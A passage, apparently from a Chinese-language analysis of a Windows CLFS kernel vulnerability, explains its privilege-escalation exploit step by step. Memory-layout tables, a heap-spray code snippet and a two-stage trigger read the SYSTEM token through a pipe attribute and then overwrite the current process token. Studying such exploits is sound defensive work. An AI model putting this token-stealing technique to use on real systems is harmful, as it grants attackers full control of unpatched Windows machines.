![image](https://image.3001.net/images/20230814/1692003878_64d9ee267e9d4c313355b.png!small)

addr| val  
---|---  
0x10000| 0x5000000  
0x10008| AttributeValueSize_ptr  
0x10010| 0x5000000  
0x10018| AttributeValueSize_ptr  
......| ........  
0x100fff0| 0x5000000  
  
  

addr| val  
---|---  
0x5000000| 0x123456789  
0x5000008| SeSetAccessStateGenericMapping  
0x5000010| 0  
0x5000018| ClfsEarlierLsn  
  
![image](https://image.3001.net/images/20230814/1692003889_64d9ee31135dd0c359b62.png!small)

在调用完函数ClfsEarlierLsn后,rdx寄存器的值一定为0xFFFFFFFF,我们在前面构造的堆喷中是处理了这块内存的

![image](https://image.3001.net/images/20230814/1692003898_64d9ee3a60b2874f051ff.png!small)

看下SeSetAccessStateGenericMapping函数的作用,就是将rdx中地址16字节的数据写入到[[rcx+48]+8]处.

而此处0xFFFFFFFF为system_eprocess&0xfffffffffffff000

AttributeValueSize_ptr+8为AttributeValue.

此时AttributeValue被覆盖为了system_eprocess&0xfffffffffffff000.

![image](https://image.3001.net/images/20230814/1692003909_64d9ee454ac7c00493075.png!small)

而后调用_NtFsControlFile,传入参数0x110038读取管道属性,由于AttributeValue被覆盖,这里可以直接读取到system的eprocess,获取到了system
token.赋给了System_token_value.

 **第二次触发:**

使用了flag标记了执行次数,在第二次执行时,然后设置每次偏移+8的值为当前进程token_addr-8的地址.

当再次执行到SeSetAccessStateGenericMapping函数的时候,此时System_token_value里面存储了第一次触发漏洞获取的system
token值,并将system token设置到了内存0xffffffff.

此时触发漏洞,再次执行了SeSetAccessStateGenericMapping,此时就将Token_address_current_minus_8+8的值覆盖为了system_token,完成了提权.

addr| val  
---|---  
0x10000| 0x5000000  
0x10008| Token_address_current_minus_8  
0x10010| 0x5000000  
0x10018| Token_address_current_minus_8  
......| ........  
0x100fff0| 0x5000000  
      
    
    if (flag == 1) {
    			//Arranging the memory for second attempt
    
    			*(UINT64*)dest2 = System_token_value; //0xffffffff=system_token
    			*(UINT64*)dest3 = next_token;
    			UINT64 Token_address_current_minus_8 = g_EProcessAddress + 0x4b8 - 8;
    
    			printf("ADDRESS of MY PROCESSS TOKEN -8= %p\n", Token_address_current_minus_8);
    
    
    			for (int i = 8; i < 0x1000000; i += 0x10)
    			{
    				*(UINT64*)(i + 0x10000) = (UINT64)Token_address_current_minus_8;
    			}
    
    			*(UINT64*)(0x5000000) = 0x123456789;
    			*(UINT64*)(0x5000018) = fnClfsEarlierLsn;
    			*(UINT64*)(0x5000008) = fnSeSetAccessStateGenericMapping;
    		}
    

## 4.总结

分析这个漏洞花了挺长时间的,主要是对clfs的结构不熟悉,查阅了很多资料.漏洞的成因也比较复杂.利用的代码很有意思,非常值得学习,其中还涉及到了对win10的兼容性处理,这部分就不再花时间分析了.

